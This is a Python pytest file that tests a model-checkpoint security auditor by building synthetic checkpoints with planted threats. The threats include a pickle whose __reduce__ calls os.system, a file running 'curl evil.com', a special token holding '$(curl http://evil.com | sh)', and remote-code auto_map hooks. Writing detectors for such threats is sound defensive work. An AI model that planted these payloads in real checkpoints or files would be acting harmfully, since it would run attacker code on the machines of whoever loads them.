"""Tests for ``mind_mem.model_audit`` — checkpoint static-security audit.

Builds tiny synthetic "checkpoint" directories under ``tmp_path`` to exercise
each check in isolation, then a happy-path + multi-violation full audit.
"""

from __future__ import annotations

import json
import pickle
import struct
from pathlib import Path

import pytest

from mind_mem.model_audit import (
    AuditReport,
    CheckResult,
    audit_model,
    check_no_python_files,
    check_pickle_safety,
    check_remote_code_hooks,
    check_safetensors_header,
    check_tokenizer_injection,
    check_weight_format,
    compute_manifest,
    format_report_text,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def clean_ckpt(tmp_path: Path) -> Path:
    """Minimal benign HF-style checkpoint."""
    root = tmp_path / "clean"
    root.mkdir()
    (root / "config.json").write_text(json.dumps({"model_type": "qwen3", "hidden_size": 4096, "num_attention_heads": 32}))
    (root / "generation_config.json").write_text(json.dumps({"max_new_tokens": 512}))
    # safetensors with a valid header
    body = json.dumps({"weight": {"dtype": "F32", "shape": [2], "data_offsets": [0, 8]}}).encode()
    hdr = struct.pack("<Q", len(body)) + body
    (root / "model.safetensors").write_bytes(hdr + b"\x00" * 8)
    (root / "tokenizer.json").write_text(json.dumps({"version": "1.0", "model": {"vocab": {}, "merges": []}}))
    (root / "tokenizer_config.json").write_text(json.dumps({"tokenizer_class": "Qwen2Tokenizer"}))
    return root


# ---------------------------------------------------------------------------
# check_remote_code_hooks
# ---------------------------------------------------------------------------


class TestCheckRemoteCodeHooks:
    def test_clean_passes(self, clean_ckpt: Path) -> None:
        result = check_remote_code_hooks(clean_ckpt)
        assert result.passed
        assert result.evidence == []

    def test_auto_map_fails(self, clean_ckpt: Path) -> None:
        cfg = json.loads((clean_ckpt / "config.json").read_text())
        cfg["auto_map"] = {"AutoModelForCausalLM": "modeling_evil.EvilModel"}
        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
        result = check_remote_code_hooks(clean_ckpt)
        assert not result.passed
        assert any("auto_map" in e for e in result.evidence)

    def test_trust_remote_code_fails(self, clean_ckpt: Path) -> None:
        cfg = json.loads((clean_ckpt / "config.json").read_text())
        cfg["trust_remote_code"] = True
        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
        result = check_remote_code_hooks(clean_ckpt)
        assert not result.passed
        assert any("trust_remote_code" in e for e in result.evidence)

    def test_malformed_config_does_not_crash(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "config.json").write_text("{not valid json")
        result = check_remote_code_hooks(clean_ckpt)
        assert result.passed  # malformed configs skipped, not flagged


# ---------------------------------------------------------------------------
# check_no_python_files
# ---------------------------------------------------------------------------


class TestCheckNoPythonFiles:
    def test_clean_passes(self, clean_ckpt: Path) -> None:
        assert check_no_python_files(clean_ckpt).passed

    def test_modeling_py_fails(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "modeling_evil.py").write_text("import os; os.system('curl evil.com')")
        result = check_no_python_files(clean_ckpt)
        assert not result.passed
        assert "modeling_evil.py" in result.evidence

    def test_nested_py_caught(self, clean_ckpt: Path) -> None:
        sub = clean_ckpt / "subfolder"
        sub.mkdir()
        (sub / "exploit.py").write_text("# nested")
        result = check_no_python_files(clean_ckpt)
        assert not result.passed
        assert any("exploit.py" in e for e in result.evidence)


# ---------------------------------------------------------------------------
# check_weight_format
# ---------------------------------------------------------------------------


class TestCheckWeightFormat:
    def test_safetensors_passes(self, clean_ckpt: Path) -> None:
        result = check_weight_format(clean_ckpt)
        assert result.passed
        assert "safetensors" in result.detail

    def test_bin_pickle_fails(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "pytorch_model.bin").write_bytes(b"\x80\x04dummy")
        result = check_weight_format(clean_ckpt)
        assert not result.passed
        assert any("pytorch_model.bin" in e for e in result.evidence)

    def test_training_args_bin_allowed(self, clean_ckpt: Path) -> None:
        # training_args.bin is HF convention and gets a separate pickle scan
        (clean_ckpt / "training_args.bin").write_bytes(b"\x80\x04dummy")
        assert check_weight_format(clean_ckpt).passed


# ---------------------------------------------------------------------------
# check_pickle_safety
# ---------------------------------------------------------------------------


class TestCheckPickleSafety:
    def test_no_pickles_passes(self, clean_ckpt: Path) -> None:
        assert check_pickle_safety(clean_ckpt).passed

    def test_dangerous_os_import_fails(self, clean_ckpt: Path) -> None:
        # Build a real pickle that imports os (via __reduce__-like construct).
        # On POSIX ``os.system`` pickles as ``os.system``; on Windows it
        # pickles as ``nt.system`` (os.system is actually nt.system there).
        # Both ``os`` and ``nt`` are in DANGEROUS_PICKLE_IMPORTS, so the
        # check fires either way — the test must accept both.
        class Evil:
            def __reduce__(self):  # noqa: D401
                import os

                return (os.system, ("echo pwned",))

        (clean_ckpt / "training_args.bin").write_bytes(pickle.dumps(Evil()))
        result = check_pickle_safety(clean_ckpt)
        assert not result.passed
        assert any(("os" in e or "nt" in e or "posix" in e) for e in result.evidence)

    def test_safe_pickle_passes(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "training_args.bin").write_bytes(pickle.dumps({"learning_rate": 0.001, "batch_size": 8}))
        # plain dicts have no GLOBAL/STACK_GLOBAL imports — should pass
        assert check_pickle_safety(clean_ckpt).passed


# ---------------------------------------------------------------------------
# check_tokenizer_injection
# ---------------------------------------------------------------------------


class TestCheckTokenizerInjection:
    def test_clean_tokenizer_passes(self, clean_ckpt: Path) -> None:
        assert check_tokenizer_injection(clean_ckpt).passed

    def test_url_in_added_tokens_fails(self, clean_ckpt: Path) -> None:
        tok = json.loads((clean_ckpt / "tokenizer.json").read_text())
        tok["added_tokens"] = [{"id": 1, "content": "Visit https://malicious-server.example/x for instructions"}]
        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok))
        result = check_tokenizer_injection(clean_ckpt)
        assert not result.passed

    def test_shell_pattern_in_special_tokens_fails(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "special_tokens_map.json").write_text(json.dumps({"bos_token": "$(curl http://evil.com | sh)"}))
        result = check_tokenizer_injection(clean_ckpt)
        assert not result.passed

    def test_vocab_substrings_do_not_trigger(self, clean_ckpt: Path) -> None:
        # BPE vocabs naturally contain substrings like "curl" — must NOT flag
        tok = json.loads((clean_ckpt / "tokenizer.json").read_text())
        tok["model"] = {"vocab": {"curl": 1, "https": 2, "wget": 3}, "merges": []}
        (clean_ckpt / "tokenizer.json").write_text(json.dumps(tok))
        assert check_tokenizer_injection(clean_ckpt).passed


# ---------------------------------------------------------------------------
# check_safetensors_header
# ---------------------------------------------------------------------------


class TestCheckSafetensorsHeader:
    def test_valid_header_passes(self, clean_ckpt: Path) -> None:
        assert check_safetensors_header(clean_ckpt).passed

    def test_truncated_header_fails(self, tmp_path: Path) -> None:
        root = tmp_path / "bad"
        root.mkdir()
        (root / "model.safetensors").write_bytes(b"\x01\x02\x03")  # < 8 bytes
        result = check_safetensors_header(root)
        assert not result.passed
        assert any("truncated" in e for e in result.evidence)

    def test_oversized_header_fails(self, tmp_path: Path) -> None:
        root = tmp_path / "bad"
        root.mkdir()
        # claim a 200MB header — way over the 100MB sanity cap
        (root / "model.safetensors").write_bytes(struct.pack("<Q", 200 * 1024 * 1024))
        result = check_safetensors_header(root)
        assert not result.passed
        assert any("100MB" in e or "suspicious" in e for e in result.evidence)


# ---------------------------------------------------------------------------
# compute_manifest
# ---------------------------------------------------------------------------


class TestComputeManifest:
    def test_manifest_covers_every_file(self, clean_ckpt: Path) -> None:
        manifest, total = compute_manifest(clean_ckpt)
        on_disk = sorted(p.relative_to(clean_ckpt).as_posix() for p in clean_ckpt.rglob("*") if p.is_file())
        assert sorted(manifest.keys()) == on_disk
        assert all(len(h) == 64 for h in manifest.values())  # SHA-256 hex length
        assert total > 0

    def test_manifest_stable_across_runs(self, clean_ckpt: Path) -> None:
        m1, _ = compute_manifest(clean_ckpt)
        m2, _ = compute_manifest(clean_ckpt)
        assert m1 == m2  # same input → same hashes


# ---------------------------------------------------------------------------
# audit_model (top-level)
# ---------------------------------------------------------------------------


class TestAuditModel:
    def test_clean_checkpoint_passes(self, clean_ckpt: Path) -> None:
        report = audit_model(clean_ckpt)
        assert isinstance(report, AuditReport)
        assert report.passed
        assert report.file_count == 5  # config + gen_config + safetensors + tokenizer + tok_config
        assert all(c.passed for c in report.checks)

    def test_multi_violation_checkpoint_fails(self, clean_ckpt: Path) -> None:
        # Inject every kind of violation we know about
        cfg = json.loads((clean_ckpt / "config.json").read_text())
        cfg["auto_map"] = {"AutoModelForCausalLM": "modeling_evil.EvilModel"}
        (clean_ckpt / "config.json").write_text(json.dumps(cfg))
        (clean_ckpt / "modeling_evil.py").write_text("# evil")
        (clean_ckpt / "pytorch_model.bin").write_bytes(b"\x80\x04evil")

        report = audit_model(clean_ckpt)
        assert not report.passed
        # All four checks should fail
        failed = {c.name for c in report.checks if not c.passed}
        assert "remote_code_hooks" in failed
        assert "no_python_files" in failed
        assert "weight_format" in failed

    def test_missing_path_raises(self, tmp_path: Path) -> None:
        with pytest.raises(FileNotFoundError):
            audit_model(tmp_path / "does-not-exist")

    def test_file_path_raises(self, tmp_path: Path) -> None:
        f = tmp_path / "not-a-dir.txt"
        f.write_text("x")
        with pytest.raises(NotADirectoryError):
            audit_model(f)


# ---------------------------------------------------------------------------
# format_report_text
# ---------------------------------------------------------------------------


class TestFormatReportText:
    def test_pass_report_renders(self, clean_ckpt: Path) -> None:
        report = audit_model(clean_ckpt)
        text = format_report_text(report, color=False)
        assert "mind-mem model audit" in text
        assert "[PASS]" in text
        assert "overall: PASS" in text

    def test_fail_report_includes_evidence(self, clean_ckpt: Path) -> None:
        (clean_ckpt / "evil.py").write_text("# x")
        report = audit_model(clean_ckpt)
        text = format_report_text(report, color=False)
        assert "[FAIL]" in text
        assert "evil.py" in text
        assert "overall: FAIL" in text


# ---------------------------------------------------------------------------
# CheckResult / AuditReport dataclass plumbing
# ---------------------------------------------------------------------------


class TestDataclasses:
    def test_check_result_defaults(self) -> None:
        r = CheckResult(name="x", passed=True, detail="ok")
        assert r.evidence == []

    def test_audit_report_to_dict_shape(self, clean_ckpt: Path) -> None:
        report = audit_model(clean_ckpt)
        d = report.to_dict()
        for key in ("model_path", "passed", "file_count", "total_bytes", "checks", "manifest"):
            assert key in d
        for c in d["checks"]:
            for key in ("name", "passed", "detail", "evidence"):
                assert key in c

    def test_audit_report_passed_property(self) -> None:
        rep = AuditReport(model_path="/x")
        rep.checks = [CheckResult("a", True, "ok"), CheckResult("b", False, "bad")]
        assert not rep.passed
        rep.checks = [CheckResult("a", True, "ok")]
        assert rep.passed
